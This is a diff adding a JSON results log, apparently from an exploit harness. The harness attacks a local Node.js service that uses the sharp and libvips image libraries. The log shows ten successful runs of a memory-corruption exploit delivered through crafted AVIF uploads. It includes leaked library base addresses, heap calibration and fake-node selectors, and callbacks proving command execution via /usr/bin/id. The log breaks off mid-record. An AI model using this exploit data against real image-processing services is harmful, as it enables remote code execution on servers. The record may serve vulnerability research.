@@ -1,0 +1,5213 @@
+{
+  "profile_manifest": "profiles/native_stack_profiles.json",
+  "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+  "stock_environment": true,
+  "lifetimes": 10,
+  "successes": 10,
+  "success_rate": 1.0,
+  "unique_profile_selections": 10,
+  "distinct_libvips_bases": 10,
+  "results": [
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7fbf2c400000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7fbf2c400000",
+            "response_sha256": "1d8d3c7883f49e32439e61ebfa5826405f9befcf0455bec7e24eb3c617e918f1",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xebd28",
+                "arena_base": "0x7fbf14000000",
+                "arena_sentinel": "0x7fbf14000098",
+                "related_pointer": "0x7fbf1455fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7fbf144f6e30",
+                "anchor_page": "0x7fbf144f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7fbf144f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7fbf2c73cd0f",
+                  "0x7fbf2c73de99",
+                  "0x7fbf2c5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7fbf144f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xf18e8",
+                "arena_base": "0x7fbf14000000",
+                "arena_sentinel": "0x7fbf14000098",
+                "related_pointer": "0x7fbf1455fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7fbf144fc9f0",
+                "anchor_page": "0x7fbf144fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7fbf144fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7fbf2c73cd0f",
+                  "0x7fbf2c73de99",
+                  "0x7fbf2c5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7fbf144fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 2,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 2,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7fbf2c400000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fbf2c5be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6860"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fbf2c5c3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6858",
+              "0x8608",
+              "0x9688"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fbf2c5c3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6868",
+              "0x8618",
+              "0x9698"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7fbf2c400000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7fbf2c5be1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x6860"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7fbf2c5c3120",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x6858",
+                  "0x8608",
+                  "0x9688"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7fbf2c5c3130",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x6868",
+                  "0x8618",
+                  "0x9698"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5740,
+                "distinct_pointer_qwords": 2184,
+                "supported_bases": [
+                  {
+                    "base": "0x7fbf2c400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7fbf2c5be1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6860"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7fbf2c5c3120",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6858",
+                          "0x8608",
+                          "0x9688"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7fbf2c5c3130",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6868",
+                          "0x8618",
+                          "0x9698"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7fbf13e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7fbf14029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xe21b0",
+                          "0xe21b8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7fbf14029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7b8e0",
+                          "0x7b8e8",
+                          "0x7b8f0",
+                          "0x7b8f8",
+                          "0x7b900",
+                          "0x7b908",
+                          "0x7b910",
+                          "0x7b918"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7fbf2d065000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7fbf2d2231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7cab0"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7fbf2d228120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7d028",
+                          "0x7d0c0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7fbf13e57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7fbf140151b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xb0c8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7fbf1401a130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xb6e0"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 2
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-bee4aa39bbcc442aa741f30bd6ae16e4.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 1,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f3d02c00000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f3d02c00000",
+            "response_sha256": "b83333b9d7baa17eff7d956f84344066de019a64074b1ab449132411e6523bcb",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xf2808",
+                "arena_base": "0x7f3ce4000000",
+                "arena_sentinel": "0x7f3ce4000098",
+                "related_pointer": "0x7f3ce455fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7f3ce44f6e30",
+                "anchor_page": "0x7f3ce44f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f3ce44f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f3d02f3cd0f",
+                  "0x7f3d02f3de99",
+                  "0x7f3d02db8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f3ce44f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xf83c8",
+                "arena_base": "0x7f3ce4000000",
+                "arena_sentinel": "0x7f3ce4000098",
+                "related_pointer": "0x7f3ce455fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7f3ce44fc9f0",
+                "anchor_page": "0x7f3ce44fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f3ce44fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f3d02f3cd0f",
+                  "0x7f3d02f3de99",
+                  "0x7f3d02db8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f3ce44fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 2,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 2,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f3d02c00000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f3d02dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd340"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f3d02dc3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd338",
+              "0xf0e8",
+              "0x10168"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f3d02dc3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xd348",
+              "0xf0f8",
+              "0x10178"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f3d02c00000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7f3d02dbe1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd340"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7f3d02dc3120",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd338",
+                  "0xf0e8",
+                  "0x10168"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7f3d02dc3130",
+                "repetitions": 3,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd348",
+                  "0xf0f8",
+                  "0x10178"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5501,
+                "distinct_pointer_qwords": 1991,
+                "supported_bases": [
+                  {
+                    "base": "0x7f3d02c00000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f3d02dbe1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd340"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f3d02dc3120",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd338",
+                          "0xf0e8",
+                          "0x10168"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f3d02dc3130",
+                        "repetitions": 3,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd348",
+                          "0xf0f8",
+                          "0x10178"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f3ce3e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f3ce4029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xe8c90",
+                          "0xe8c98"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f3ce4029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x823c0",
+                          "0x823c8",
+                          "0x823d0",
+                          "0x823d8",
+                          "0x823e0",
+                          "0x823e8",
+                          "0x823f0",
+                          "0x823f8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f3ce3e57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f3ce40151b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x11ba8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f3ce401a130",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6ae0",
+                          "0x121c8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f3d03865000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f3d03a231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83590"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f3d03a28120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83b08",
+                          "0x83ba0"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 2
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-cf3f5424ab064de7a8265c369b53328a.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 2,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f303c400000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "no_match",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f303c400000",
+            "response_sha256": "16e6332bc0352c9ff682215b5ee39c744a4c17adb633975fe38294d2dc8cb426",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": 0,
+            "matches": [],
+            "candidate_selectors": [],
+            "attempt": 5,
+            "classification_status": "selected"
+          },
+          {
+            "status": "no_match",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f303c400000",
+            "response_sha256": "ab43c9692e28380ff4d023c75145eafce8c45253a10e4e0d17468cd90a344f5c",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 0,
+            "selected_anchor_rank": 0,
+            "matches": [],
+            "candidate_selectors": [],
+            "attempt": 6,
+            "classification_status": "no_match"
+          },
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f303c400000",
+            "response_sha256": "edda5d917d0408eeb371d4319c9f585659a13f73739abc8ab108c42c240b74d4",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xde388",
+                "arena_base": "0x7f3020000000",
+                "arena_sentinel": "0x7f3020000098",
+                "related_pointer": "0x7f302055fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7f30204f6e30",
+                "anchor_page": "0x7f30204f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f30204f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f303c73cd0f",
+                  "0x7f303c73de99",
+                  "0x7f303c5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f30204f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xe3f48",
+                "arena_base": "0x7f3020000000",
+                "arena_sentinel": "0x7f3020000098",
+                "related_pointer": "0x7f302055fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7f30204fc9f0",
+                "anchor_page": "0x7f30204fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f30204fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f303c73cd0f",
+                  "0x7f303c73de99",
+                  "0x7f303c5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f30204fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 7,
+            "classification_status": "no_match"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 5,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f303c400000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f303c5be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x538e0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f303c5c3120",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x538d8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f303c5c3130",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x538e8"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 2
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5249,
+                "distinct_pointer_qwords": 2005,
+                "supported_bases": [],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f303d065000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f303d2231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6cd90"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f303d228120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6d308",
+                          "0x6d3a0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f303c400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f303c5c3120",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xfefa8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f303c5c3130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xfefb8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f301be66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f301c029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6bbc0",
+                          "0x6bbc8",
+                          "0x6bbd0",
+                          "0x6bbd8",
+                          "0x6bbe0",
+                          "0x6bbe8",
+                          "0x6bbf0",
+                          "0x6bbf8"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 3
+          },
+          {
+            "status": "no_match",
